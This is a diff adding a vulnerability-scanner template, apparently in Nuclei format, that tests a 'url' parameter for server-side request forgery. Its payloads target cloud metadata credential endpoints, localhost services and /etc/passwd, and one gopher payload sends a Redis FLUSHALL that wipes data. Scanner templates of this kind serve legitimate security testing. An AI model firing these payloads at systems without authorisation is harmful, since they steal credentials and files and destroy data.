@@ -1,0 +1,49 @@
+id: scanforge-ssrf-via-url-parameter
+
+info:
+  name: SSRF via URL Parameter
+  author: ScanForge
+  severity: high
+  description: A Server-Side Request Forgery (SSRF) vulnerability via a URL parameter, allowing access to internal services and metadata endpoints.
+  tags: ssrf,web,parameter
+  reference:
+    - https://portswigger.net/web-security/ssrf
+    - https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration.html
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/?url=http://169.254.169.254/latest/meta-data/"
+      - "{{BaseURL}}/?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"
+      - "{{BaseURL}}/?url=http://metadata.google.internal/computeMetadata/v1/"
+      - "{{BaseURL}}/?url=http://169.254.169.254/metadata/instance?api-version=2021-02-01"
+      - "{{BaseURL}}/?url=http://localhost:8080"
+      - "{{BaseURL}}/?url=http://127.0.0.1:8080"
+      - "{{BaseURL}}/?url=http://[::1]:8080"
+      - "{{BaseURL}}/?url=file:///etc/passwd"
+      - "{{BaseURL}}/?url=dict://localhost:11211/stat"
+      - "{{BaseURL}}/?url=gopher://localhost:6379/_*1%0d%0a%248%0d%0aflushall%0d%0a"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "iam"
+          - "security-credentials"
+          - "instance-id"
+          - "ami-id"
+          - "project-id"
+          - "subscriptionId"
+          - "root:"
+          - "daemon:"
+          - "STAT"
+          - "redis"
+        condition: or
+    extractors:
+      - type: regex
+        part: body
+        regex:
+          - "(?m)^(.{0,500})$"
